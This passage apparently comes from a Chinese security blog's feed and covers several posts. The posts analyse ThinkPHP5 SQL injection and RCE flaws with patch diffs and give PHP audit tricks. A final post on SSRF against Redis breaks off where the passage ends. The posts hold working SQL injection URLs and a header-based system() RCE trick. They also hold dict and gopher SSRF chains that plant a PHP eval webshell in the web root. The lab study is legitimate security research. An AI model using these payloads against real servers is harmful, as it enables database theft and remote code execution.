T^T，显然事情没这么简单，我们还是得继续老实向前分析调用栈。动态调试一下看看调用栈里是谁翻了<code>param</code>方法的牌子：</p><p><img src="/img/tp5ldfxrce_m.png"></p><p><code>self::$debug</code>就是框架从配置文件中加载的值，所以关掉<code>app_debug</code>就不会调用到<code>param</code>方法了（淦）。那还有没有办法调用到呢？全局搜索可以看到当<code>App</code>类的<code>exec</code>方法中<code>$dispatch[&#39;type&#39;]</code>为<code>controller</code>或是<code>method</code>时就可以。</p><p><img src="/img/tp5ldfxrce_n.png"></p><p>于是继续跟进方法调用和变量传递：</p><p><img src="/img/tp5ldfxrce_o.png"></p><p><img src="/img/tp5ldfxrce_p.png"></p><p><img src="/img/tp5ldfxrce_q.png"></p><p><code>check</code>方法里面有点复杂。。。马后炮一下直接先看<code>parseRule</code>方法：</p><p><img src="/img/tp5ldfxrce_r.png"></p><p>需要<code>$route</code>为<code>\</code>或者<code>@</code>，继续回去跟进变量传递：</p><p><img src="/img/tp5ldfxrce_s.png"></p><p>TP5完整版或是通过<code>composer require topthink/think-captcha 1.*</code>安装的验证码扩展，会在<code>vendor/topthink/think-captcha/src/helper.php</code>中注册一条<code>get</code>路由。由于此处<code>$method</code>是通过<code>$request-&gt;method()</code>获取到的，所以能够通过$_POST传入<code>&amp;method=get</code>间接对其进行变量覆盖。</p><p><img src="/img/tp5ldfxrce_t.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/222672">ThinkPHP5.0.x RCE分析与利用</a></p><p><a href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">THINKPHP 5.X RCE 漏洞分析与利用总结</a></p><p><a href="https://www.anquanke.com/post/id/177173">天融信关于ThinkPHP5.1框架结合RCE漏洞的深入分析</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p><p><a href="https://paper.seebug.org/1377/">ThinkPHP 组件漏洞与攻击链分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境搭建基础可以参考SQL注入篇和官方文档&lt;/p&gt;
&lt;h2 id=&quot;代码执行1&quot;&gt;&lt;a href=&quot;#代码执行1&quot; class=&quot;headerlink&quot; title=&quot;代码执行1&quot;&gt;&lt;/a&gt;代码执行1&lt;/h2&gt;&lt;p&gt;通过传参可以调用任意类方法，调用一些具有回调功能的函数时可</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="rce" scheme="https://hosch3n.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析SQL注入篇</title>
    <link href="https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</id>
    <published>2020-10-21T13:12:12.000Z</published>
    <updated>2020-12-02T08:51:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。</p><ol start="0"><li>通过composer拉取项目</li></ol><p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p><ol><li>调整<code>composer.json</code>中的依赖为需要测试的具体版本</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ol start="2"><li><p>执行<code>composer update</code>更新项目</p></li><li><p>创建mysql数据库</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">    id int primary key auto_increment,</span><br><span class="line">    username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;hoschen&#39;);</span><br><span class="line">create user tpdemo@localhost identified by &#39;passwd&#39;;</span><br><span class="line">grant all on tpdemo.* to tpdemo@localhost;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>配置<code>application/database.php</code>中对应参数</p></li><li><p>将<code>application/config.php</code>中的<code>app_debug</code>和<code>app_trace</code>改为<code>true</code>，用于回显错误</p></li><li><p>编写<code>application/index/controller/Index.php</code>模块的代码构造漏洞输入点</p></li></ol><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseData方法，将未过滤的用户输入拼接进insert/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.13&lt;=ThinkPHP&lt;=5.0.15</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.5</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;inc&amp;username[1]&#x3D;exp(~(select * from(select user())a))&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.18">5.0.16</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/091e7b734d4ce3e1288f47a7932a143fad73a4bd?branch=091e7b734d4ce3e1288f47a7932a143fad73a4bd&diff=split">改进inc/dec查询</a>这个commit</p><p><img src="/img/tp5ldfxsqli_a.png"></p><p>将源码版本更新为<code>5.0.15</code>，由<code>thinkphp/library/think/db/Builder.php</code>的113行可知触发这部分逻辑需要传入一个数组：</p><p><img src="/img/tp5ldfxsqli_b.png"></p><p>全局搜索对应的<code>parseData</code>方法，看到可以由718行的<code>insert</code>方法或是由823行的<code>update</code>方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 通过request助手函数的get方法，获取$_GET[&#x27;username&#x27;]的数据</span></span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="comment">// 通过db助手函数的insert方法，传入username数组（上面/a修饰符表示数组类型）</span></span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="comment">// 也可以通过update方法</span></span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;,1)-&gt;update([&#x27;username&#x27; =&gt; $username]);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>即对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，于是传入<code>username[0]=dec&amp;username[1]=a&amp;username[2]=1</code>进行动态调试，中间经过<code>parseKey</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_c.png"></p><p>显然<code>str_replace</code>函数是一个功能性函数，而并非是安全过滤函数，最终使得用户提供的数据被直接拼接进SQL语句中。</p><p>因为<code>username[0]</code>用于控制switch语句条件、<code>username[2]</code>会经过<code>floatval</code>函数强转，所以尝试通过<code>username[1]</code>传入报错注入Payload：</p><p><code>username[0]=dec&amp;username[1]=(extractvalue(1,concat(0x7e,(select user()),0x7e)))&amp;username[2]=1</code></p><p>得到报错：<code>1105 Only constant XPATH queries are supported</code>，XPATH系列用不了，换一种：</p><p><code>username[0]=dec&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))-1) &quot;</code></p><p><img src="/img/tp5ldfxsqli_d.png"></p><p><code>update</code>方法类似就不再赘述了，需要注意的是官方修复时仅处理了<code>inc</code>和<code>dec</code>条件，但是并没有改动同样在switch语句中的<code>exp</code>条件，原因是当<code>username[0]</code>为<code>exp</code>时，会被<code>thinkphp/library/think/Request.php</code>中1096行的<code>filterExp</code>方法替换为<code>exp[空格]</code>，最终因为不满足switch语句的任意条件被结束。</p><h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseArrayData方法，将未过滤的用户输入拼接进insert/insertAll/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.6&lt;=ThinkPHP&lt;=5.1.7、以及部分5.1.8</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;point&amp;username[1]&#x3D;a&amp;username[2]&#x3D;exp(~(select * from(select user())a))^&amp;username[3]&#x3D;a</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.13">5.1.9</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/39bb0fe6d50ee77e0779f646b10bce08c442a5e3">改进mysql驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_e.png"></p><p>直接删掉了<code>default</code>分支和<code>parseArrayData</code>方法。将源码版本更新为<code>5.1.17</code>，可以看到基本与SQL注入1逻辑相同。</p><p>全局搜索对应的<code>parseData</code>方法，看到可由1030行的<code>insert</code>方法、1063行的<code>insertAll</code>方法或是由1134行的<code>update</code>方法触发。需要编写的对应触发逻辑用SQL注入1的就行，而且多了一种触发方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insertAll方法接收一个二维数组</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;insertAll([[<span class="string">&#x27;username&#x27;</span> =&gt; $username]]);</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>依然对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，这次进入default分支跟进<code>parseArrayData</code>方法，看到需要让<code>username[0]</code>为<code>point</code>不然就会嗝屁：</p><p><img src="/img/tp5ldfxsqli_f.png"></p><p>因此传入<code>username[0]=point&amp;username[1]=a&amp;username[2]=b&amp;username[3]=c</code>进行动态调试，中间经过<code>parseData</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_g.png"></p><p>方便起见直接在<code>b</code>的位置传入报错注入Payload并闭合语句：</p><p><code>username[0]=point&amp;username[1]=a&amp;username[2]=exp(~(select * from(select user())a))^&amp;username[3]=a</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))^(&#39;a(a)&#39;)) &quot;</code></p><p><img src="/img/tp5ldfxsqli_h.png"></p><ul><li><code>update</code>和<code>insertAll</code>方法同理</li></ul><h2 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseWhereItem方法，将未过滤完全的用户输入拼接进where语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.10</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;anything&amp;username[2]&#x3D;)%20union%20select%20database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.14">5.0.11</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/495020b7b0c16de40f20b08f2ab3be0a2b816b96">改进Request类filterExp方法</a>这个commit，增加了对<code>not like</code>的过滤。</p><p><img src="/img/tp5ldfxsqli_j.png"></p><p>凡是使用框架提供的请求变量获取方法(Request类<code>param</code>方法及<code>input</code>助手函数)，都会经过这个<code>filterExp</code>方法的过滤。针对<code>not like</code>操作符，编写对应的<code>where</code>方法触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>相比前两个代码改动直接在漏洞点的补丁分析，这里的代码改动是在全局过滤函数的规则上，该如何根据这个变动敏感地嗅探到能被利用漏洞点呢？这是需要之后进一步思考的地方。</p><p>带着这个问题动态调试可以发现，输入流过程中有很多针对数组的解析函数，也会理解Payload要这样构造的原因：当然就是要满足一些if判断逻辑，让输入流进入到预期漏洞代码块了hhh（废话）</p><p><img src="/img/tp5ldfxsqli_k.png"></p><ul><li>因为PHP7的原因，需要调整一下implode函数的参数顺序</li></ul><p><img src="/img/tp5ldfxsqli_l.png"></p><p>一波拼接操作后生成的<code>whereStr</code>为<code>&quot;(`username` NOT LIKE &#39;%%&#39; ) UNION SELECT DATABASE(),USER()# `username` NOT LIKE &#39;anything&#39;)&quot;</code></p><p>这样就能让<code>username</code>字段匹配不到NULL之外的值避免占据回显点位，同时注释掉后面被implode函数合并进来的副作用语句，避免语法错误。</p><p>最终带入数据库执行的SQL语句为：</p><p><img src="/img/tp5ldfxsqli_m.png"></p><p>官方在个版本里新引入了<code>NOT LIKE</code>这个操作符，但是没加上对应的过滤规则导致了漏洞的产生。</p><h2 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h2><p>特定模式（<code>exp</code>）下的SQL语句执行：</p><p>影响版本：</p><ul><li>全版本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username&#x3D;) union select database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里官方认为属于正常功能不作修复，因此不存在补丁更新对比。编写对应触发逻辑来调试分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p><img src="/img/tp5ldfxsqli_i.png"></p><p>流程与上一个洞类似就不赘述了，查看《ThinkPHP5.0完全开发手册》193页可以看到说明了<code>exp</code>模式就是用作SQL语法模式的，所以我个人觉得官方不认为这是一个漏洞也在情理之中。</p><h2 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseOrder方法，将未过滤的用户输入拼接进select/update/delete语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.16&lt;=ThinkPHP&lt;=5.1.22</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;orderby[id&#96;|updatexml(1,concat(0x7e,(select user()),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.23</a>版本更新说明中表示改进了order方法的数组方式解析增强安全性，具体看到<a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">改进order方法解析</a>这个commit</p><p><img src="/img/tp5ldfxsqli_n.png"></p><p>增加了对<code>)</code>和<code>#</code>符号的判断。将源码版本更新为<code>5.1.22</code>，全局搜索<code>parseOrder</code>方法，看到可以由1037行的select方法、1170行的update方法或是由1206行的delete方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$orderby = request()-&gt;get(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line"><span class="comment">// $result = db(&#x27;users&#x27;)-&gt;where([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;])-&gt;order($orderby)-&gt;find();</span></span><br><span class="line"><span class="comment">// 也可以通过update方法，</span></span><br><span class="line"><span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;order($orderby)-&gt;update([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;]);</span></span><br><span class="line"><span class="comment">// 还可以通过delete方法，支持XPATH系列函数</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;order($orderby)-&gt;delete();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>这里传入Payload动态调试后可以发现拼接而成的SQL语句为：<code>&quot;DELETE FROM `users` WHERE  `id` = :where_AND_id ORDER BY `id`|updatexml(1,concat(0x7e,(select user()),0x7e),1)#` &quot; </code></p><p>为啥这里用的delete方法？因为在我的环境下前两种方法都会得到报错：<code>1105 Only constant XPATH queries are supported</code>，而通过exp等函数整数溢出报错也无效，希望知道原因的师傅指点我一下。</p><h2 id="SQL注入6"><a href="#SQL注入6" class="headerlink" title="SQL注入6"></a>SQL注入6</h2><p>聚合查询方法将未过滤的用户输入拼接进SQL语句中，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP&lt;=5.0.21</li><li>5.1.3&lt;=ThinkPHP&lt;=5.1.25</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 5.1.11～5.1.25需要改为 id&#96;)</span><br><span class="line">id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.26</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">改进mysql驱动和sqlsrv驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_o.png"></p><p>只允许字母、数字、下划线、点号、星号，不然抛出异常。</p><ul><li>因为对框架不熟悉，想根据这类补丁对比找出具体的漏洞发生点实在是困难，得多学习历史漏洞积累经验才行。这里也由于暂未复现成功，只能先搁置一下了</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础设施&quot;&gt;&lt;a href=&quot;#基础设施&quot; class=&quot;headerlink&quot; title=&quot;基础设施&quot;&gt;&lt;/a&gt;基础设施&lt;/h2&gt;&lt;p&gt;大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。&lt;/p&gt;
&lt;ol start=&quot;0&quot;&gt;
</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="sqli" scheme="https://hosch3n.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计Tricks</title>
    <link href="https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/"/>
    <id>https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/</id>
    <published>2020-10-15T13:09:19.000Z</published>
    <updated>2020-12-07T14:43:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反序列化调用不到类"><a href="#反序列化调用不到类" class="headerlink" title="反序列化调用不到类"></a>反序列化调用不到类</h2><p><img src="/img/phpdmsjtricks_a.png"></p><p>希望调用<code>ws.php</code>中<code>CLI\Agent</code>类的析构函数，但是传入<code>new CLI\Agent()</code>的序列化字符串后并未触发<code>die</code>标记，通过动态调试发现该框架此时会去寻找<code>lib/cli/agent.php</code>（但实际上是<code>Agent</code>类与<code>WS</code>类一起写在了<code>ws.php</code>中）</p><p><img src="/img/phpdmsjtricks_b.png"></p><p>解决方法是生成序列化字符串时，通过数组<code>array(new CLI\WS(), new CLI\Agent())</code>将两个类对象按顺序一同传入。这样虽然<code>autoload</code>包含<code>agent.php</code>同样会失败，但能够包含到<code>ws.php</code>也就能成功反序列化里面的<code>Agent</code>类。</p><ul><li>也看到了通过<code>new \CLI\WS(new \CLI\Agent())</code>的形式解决的</li></ul><h2 id="函数无参数RCE"><a href="#函数无参数RCE" class="headerlink" title="函数无参数RCE"></a>函数无参数RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTTP Header</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">key: system(&#x27;ls -al&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><h2 id="链中的函数参数对应不上"><a href="#链中的函数参数对应不上" class="headerlink" title="链中的函数参数对应不上"></a>链中的函数参数对应不上</h2><p>通过PHP编写的一些自定义函数，如果一些非关键参数缺失或者多余其实影响不大。但是PHP的内置函数可能是因为由C实现的原因，兼容性就没那么高。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;反序列化调用不到类&quot;&gt;&lt;a href=&quot;#反序列化调用不到类&quot; class=&quot;headerlink&quot; title=&quot;反序列化调用不到类&quot;&gt;&lt;/a&gt;反序列化调用不到类&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/phpdmsjtricks_a.png&quot;&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="https://hosch3n.github.io/tags/php/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>SSRF打Redis规避坏字符</title>
    <link href="https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/"/>
    <id>https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/</id>
    <published>2020-09-24T16:43:14.000Z</published>
    <updated>2020-11-23T08:13:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>用dict协议通过SSRF间接打Redis的时候，数据中存在<code>:</code>、<code>&#39;</code>等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>对存在特殊字符的数据进行位运算，再在目标Redis上通过位运算将数据还原回来。<a href="https://redis.io/commands/bitop">举个栗子</a>：</p><p><img src="/img/ssrfdredisgbhzf_a.png"></p><ol start="0"><li>利用抑或的特性先set两个不会与dict协议冲突的字符串</li></ol><p><code>dict://127.0.0.1:6379/set:c:&quot;|\x7f&#125;%6!,hd\x1f\a\x05\x14\x1byqq\x1di&#123;\x7f~&quot;</code></p><p><code>dict://127.0.0.1:6379/set:b:&#39;@@@@@@@@@@@@@@@@@@@@@@&#39;</code></p><ol><li>再在目标上还原</li></ol><p><code>dict://127.0.0.1:6379/bitop:xor:a:b:c</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><p><img src="/img/ssrfdredisgbhzf_b.png"></p><h2 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h2><p>对redis-cli的命令数据抓包，利用gopher协议封装后重放给目标Redis。由于Redis的授权认证只有简单的一串<code>*2%0A%244%0Aauth%0A%248%0Afoobared</code>，且可以通过管道操作一次同时传输多条命令，因此这个方法还可以用来打知道密码的内网Redis。</p><ol start="0"><li>监听环回口6379端口并抓包</li></ol><p><code>sudo tcpdump port 6379 -i lo -w redis.pcap</code></p><p><img src="/img/ssrfdredisgbhzf_c.png"></p><ol><li>用gopher协议编码封装</li></ol><p><code>gopher://127.0.0.1:6379/_%244%0d%0aauth%0d%0a%248%0d%0afoobared%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0aa%0d%0a%2422%0d%0a%3C%3F%3Deval(%24_GET%5B911%5D)%3B%3F%3E%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2414%0d%0a%2Fvar%2Fwww%2Fhtml%2F%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0atmp.php%0d%0a*1%0d%0a%246%0d%0abgsave</code></p><ol 